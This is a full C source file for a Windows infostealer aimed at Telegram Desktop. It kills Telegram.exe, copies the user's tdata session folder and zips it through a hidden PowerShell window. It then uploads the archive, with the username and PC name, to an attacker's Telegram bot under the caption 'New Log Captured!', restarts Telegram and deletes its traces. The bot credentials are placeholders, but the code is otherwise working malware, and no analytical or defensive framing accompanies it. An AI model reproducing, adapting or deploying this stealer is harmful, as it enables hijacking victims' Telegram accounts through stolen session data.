#include <stdio.h>
#include <direct.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <curl/curl.h>

#define MAX_PATH_SIZE 512


int kill_process(const char *process_name) 
{
    HANDLE h_snapshot;
    PROCESSENTRY32 pe32;
    int found = 0;

    // Take a snapshot of all processes in the system
    h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h_snapshot == INVALID_HANDLE_VALUE) 
    {
        printf("Error. Failed to take snapshot\n");
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process in the list
    if (Process32First(h_snapshot, &pe32)) {
        do {
            // Compare the process name with the one we are looking for
            if (strcmp(pe32.szExeFile, process_name) == 0) {
                // Open the process with terminate rights
                HANDLE h_process = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (h_process != NULL) {
                    // Kill the process
                    if (TerminateProcess(h_process, 0)) {
                        printf("Process %s (PID: %lu) successfully terminated.\n", process_name, pe32.th32ProcessID);
                        found = 1;
                    } else {
                        printf("Error. Failed to terminate process %s.\n", process_name);
                    }
                    CloseHandle(h_process);
                } else {
                    printf("Error. No rights to terminate %s\n", process_name);
                }
                break; // If found and killed - break the loop
            }
        } while (Process32Next(h_snapshot, &pe32));
    }

    CloseHandle(h_snapshot);

    if (!found) {
        printf("\nProcess %s not found.\n", process_name);
    }
    return found;
}



int start_process(const char *process_path) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Zero out the structures to avoid garbage
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    // Start the process
    if (CreateProcessA(
            process_path,   // Path to exe file
            NULL,           // Command line arguments (not needed)
            NULL,           // Process security attributes
            NULL,           // Thread security attributes
            FALSE,          // Handle inheritance
            0,              // Creation flags
            NULL,           // Environment variables
            NULL,           // Current directory
            &si,            // STARTUPINFO pointer
            &pi             // PROCESS_INFORMATION pointer
        )) {
        printf("Successful, process PID: %lu\n", pi.dwProcessId);

        // Close handles to avoid memory leaks
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        } else {
            printf("Error code: %lu\n", GetLastError());
            return 1;
        }
    return 0;
}


int create_directory(const char *dirname) 
{
    if (CreateDirectoryA(dirname, NULL) != 0)
    {
        printf("Dir successfully created\n");
    }
    else 
    {
        DWORD error = GetLastError();
        if (error == ERROR_ALREADY_EXISTS)
        {
            printf("Dir was created: %s\n", dirname);
            return 0;
        }
        else 
        {
            printf("Dir not created. Error code: %lu\n", error);
            return 1;
        }
    }

    return 0;
}

int copy_directory(const char *tdpath, const char *newdir) {
    WIN32_FIND_DATAA find_data;
    HANDLE h_find;
    
    // Local arrays for the current recursion step (protection against overflow)
    char search_mask[MAX_PATH_SIZE];
    char src_file[MAX_PATH_SIZE];
    char dst_file[MAX_PATH_SIZE];

    // Create destination folder
    create_directory(newdir);

    snprintf(search_mask, MAX_PATH_SIZE, "%s\\*", tdpath);
    h_find = FindFirstFileA(search_mask, &find_data);

    if (h_find == INVALID_HANDLE_VALUE) {
        return 1;
    }

    do {
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }

        snprintf(src_file, MAX_PATH_SIZE, "%s\\%s", tdpath, find_data.cFileName);
        snprintf(dst_file, MAX_PATH_SIZE, "%s\\%s", newdir, find_data.cFileName);

        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
        {
            copy_directory(src_file, dst_file);
        }
        else 
        { 
            CopyFileA(src_file, dst_file, FALSE);
        }

    } while (FindNextFileA(h_find, &find_data) != 0);

    FindClose(h_find);
    return 0;
}

int zip_directory(const char *folder_to_zip, const char *zip_file_path)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD exit_code = 1;
    char command[1024];

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    snprintf(command, sizeof(command), "powershell.exe -WindowStyle Hidden -command \"Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\"",
             folder_to_zip, zip_file_path);
    printf("Archiving silently...\n");

    if (CreateProcessA(
            NULL,           // Application name (NULL as path is in command line)
            command,        // Command line
            NULL,           // Process security attributes
            NULL,           // Thread security attributes
            FALSE,          // Do not inherit handles
            CREATE_NO_WINDOW, // Flag hiding the window
            NULL,           // Environment variables
            NULL,           // Current directory
            &si,            // STARTUPINFO
            &pi             // PROCESS_INFORMATION
        )) 
        {
        // Wait for PowerShell to finish archiving
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        // Get exit code
        GetExitCodeProcess(pi.hProcess, &exit_code);

        // Close handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (exit_code == 0) {
            printf("Archive created successfully!\n");
            return 0;
        }
    }

    printf("Failed to create archive.\n");
    return 1;
  
}

int delete_directory(const char *dir_path) {

    WIN32_FIND_DATAA find_data;
    HANDLE h_find;
    char search_mask[MAX_PATH_SIZE];
    char file_path[MAX_PATH_SIZE];

    snprintf(search_mask, MAX_PATH_SIZE, "%s\\*", dir_path);
    h_find = FindFirstFileA(search_mask, &find_data);

    if (h_find != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
                continue;
            }

            snprintf(file_path, MAX_PATH_SIZE, "%s\\%s", dir_path, find_data.cFileName);

            // If it's a folder - go inside (recursion)
            if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                delete_directory(file_path);
            } 
            // If it's a file - delete it (remove "read-only" attribute if present)
            else {
                SetFileAttributesA(file_path, FILE_ATTRIBUTE_NORMAL);
                DeleteFileA(file_path);
            }
        } while (FindNextFileA(h_find, &find_data) != 0);
        FindClose(h_find);
    }

    // After deleting all contents, delete the folder itself
    RemoveDirectoryA(dir_path);
    return 0;
}

int send_to_telegram(const char *zip_file_path, const char *bot_token, const char *chat_id, const char *proxy_url, const char *caption_text) 
{
    CURL *curl;
    CURLcode res;
    curl_mime *mime;
    curl_mimepart *part;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) return 1;

    char url[512];
    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendDocument", bot_token);

    mime = curl_mime_init(curl);

    // Add chat_id
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "chat_id");
    curl_mime_data(part, chat_id, CURL_ZERO_TERMINATED);

    // Add message text (Caption)
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "caption");
    curl_mime_data(part, caption_text, CURL_ZERO_TERMINATED);
    
    // Enable HTML markup for beauty (bold text, etc.)
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "parse_mode");
    curl_mime_data(part, "HTML", CURL_ZERO_TERMINATED);

    // Add file
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "document");
    curl_mime_filedata(part, zip_file_path);

    // Settings
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);


    // Proxy
    if (proxy_url != NULL && strlen(proxy_url) > 0) {
        curl_easy_setopt(curl, CURLOPT_PROXY, proxy_url);
        if (strncmp(proxy_url, "socks5://", 9) == 0 || strncmp(proxy_url, "socks5h://", 10) == 0) {
            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
        }
    }

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    // Send (without printing text to console)
    res = curl_easy_perform(curl);

    curl_mime_free(mime);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return (res == CURLE_OK) ? 0 : 1;

}

int main() {

    char username[256];
    char compname[256];
    char caption[512];
    char zip_file[MAX_PATH_SIZE];
    char finalloc[MAX_PATH_SIZE];
    char finallexe[MAX_PATH_SIZE];
    char tdatapath1[MAX_PATH_SIZE];
    char tdatapath2[MAX_PATH_SIZE];
    char newdirectory[MAX_PATH_SIZE];
    char tdata_folder[MAX_PATH_SIZE];
    DWORD username_size = sizeof(username);
    DWORD compname_size = sizeof(compname);
    const char *BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    const char *CHAT_ID = "YOUR_CHAT_ID_HERE";
    const char *PROXY_URL = NULL; 
    int send_status;

    // Get username
    if (!GetUserNameA(username, &username_size)) {
        printf("Username not found\n");
        return 1;
    }
    else printf("%s\n", username);

    // Get computer name
    if (!GetComputerNameA(compname, &compname_size)) {
        printf("not found\n");
        return 1;
    }
    else printf("%s\n", compname);
    

    snprintf(caption, sizeof(caption), 
             "🚨 <b>New Log Captured!</b> 🚨\n\n"
             "👤 <b>User:</b> %s\n"
             "💻 <b>PC Name:</b> %s\n"
             "📦 <b>Log:</b> Telegram tdata folder", 
             username, compname);


    snprintf(tdatapath1, sizeof(tdatapath1), "C:\\Users\\%s\\AppData\\Roaming\\Telegram Desktop", username);
    snprintf(tdatapath2, sizeof(tdatapath2), "C:\\Users\\%s\\AppData\\Local\\Telegram Desktop", username);


    if (_chdir(tdatapath1) == 0) {
        printf("\nSuccessful, you are in %s\n", tdatapath1);
        strcpy(finalloc, tdatapath1);

    }
    else if (_chdir(tdatapath2) == 0) {
        printf("Successful, you are in %s\n", tdatapath2);
        strcpy(finalloc, tdatapath2);

    }
    else printf("Error");


    // Create a folder in the Telegram directory
    snprintf(newdirectory, sizeof(newdirectory), "%s\\TelegramData", finalloc);
    if (create_directory(newdirectory) == 1)
        printf("Error\n");

    snprintf(tdata_folder, sizeof(tdata_folder), "%s\\tdata", finalloc); // Path for copying
    snprintf(zip_file, sizeof(zip_file), "%s\\TelegramData_log.zip", finalloc); // Path for archiving

    // If Telegram was found and closed
    if (kill_process("Telegram.exe") != 0) 
    {
        // Form the path and copy all info
        copy_directory(tdata_folder, newdirectory);

        // Form the path to the folder and archive it
        zip_directory(newdirectory, zip_file);

        // Launch Telegram. If it's not in the first path, go to the second one.
        snprintf(finallexe, sizeof(finallexe), "%s\\Telegram.exe", finalloc);
        if (start_process(finallexe) == 1)
        {
            printf("Error\n");
        }

        // Send the archive to Telegram
        send_status = send_to_telegram(zip_file, BOT_TOKEN, CHAT_ID, PROXY_URL, caption);
        if (send_status == 0) 
            printf("Log successfully sent. Cleaning up....\n");
        else
            printf("Error, log not sending\n");

        // Delete TelegramData_log folder and archive
        delete_directory(newdirectory);
        DeleteFileA(zip_file);

        
    }
    else {
        
        copy_directory(tdata_folder, newdirectory);
        zip_directory(newdirectory, zip_file);

        send_status = send_to_telegram(zip_file, BOT_TOKEN, CHAT_ID, PROXY_URL, caption);
        if (send_status == 0) 
            printf("Log successfully sent. Cleaning up....\n");
        else
            printf("Error, log not sending\n");

        delete_directory(newdirectory);

    }
    

    return 0;
}